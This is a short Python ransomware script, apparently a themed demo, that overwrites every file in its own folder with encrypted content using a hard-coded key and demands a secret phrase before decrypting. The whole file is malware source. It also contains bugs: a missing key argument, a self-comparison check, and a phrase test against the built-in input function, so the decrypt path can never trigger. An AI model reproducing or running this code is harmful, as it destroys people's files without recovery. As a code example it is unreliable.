import os
import sys
import logging
from encrypt import encrypt
from decrypt import decrypt



# Encrypt files
def encrypt_file(key, filename):

    # Load the content of file
    with open(filename, 'r') as file:
        content = file.read()

    # Encrypt data
    encrypted_data = encrypt(content, key)

    # Rewrite the encrypted data in file
    with open(filename, 'w') as file:
        file.write(encrypted_data)


# Encrypt files
def decrypt_file(key, filename):

    # Load the content of file
    with open(filename, 'r') as file:
        content = file.read()

    # Decrypt data
    decrypted_data = decrypt(content, key)

    # Rewrite the decrypted data in file
    with open(filename, 'w') as file:
        content = file.write(decrypted_data)


# List of files in folder
def get_files_in_folder(path):

    files = []
    for file in os.listdir(path):

        # ignore code files
        if file == 'README.md' or file == sys.argv[0]:
            continue

        file_path = os.path.join(path, file)
        if os.path.isfile(file_path):
            files.append(file_path)

    return files


# Encrypt files
def encrypt_files_in_folder(key, path):
    
    encrypted_files = 0
    files = get_files_in_folder(path)

    # Encrypt each file in the directory.
    for file in files:
        logging.debug('Encrypting file: {}'.format(file))
        encrypt_file(key, file)
        encrypted_files += 1

    return encrypted_files


# Decrypt files
def decrypt_files_in_folder(key, path):
    
    if key != key:
        print('Wrong key!')
        return

    files = get_files_in_folder(path)

    # Decrypt each file in the directory.
    for file in files:
        decrypt_file(key, file)


# MAIN FUNCTION 
if __name__ == '__main__':

    # Safeguard against running into your own computer
    safeguard = input('Enter the password to run')
    if(safeguard != 'initiate'):
        quit()


    # Key (could be generated through algo)
    key = "voldemort"

    # Encrypt files of same folder (which has maze)
    path = os.path.dirname(os.path.abspath(__file__))
    number_encrypted_files = encrypt_files_in_folder(path)
    print('Number of encrypted files: {}'.format(number_encrypted_files))


    # Ransomware real work
    phrase = input('Enter the secret phrase: ')

    if(input == "Don't let the muggles get you down"):
        decrypt_files_in_folder(key, path)
    else:    
        quit()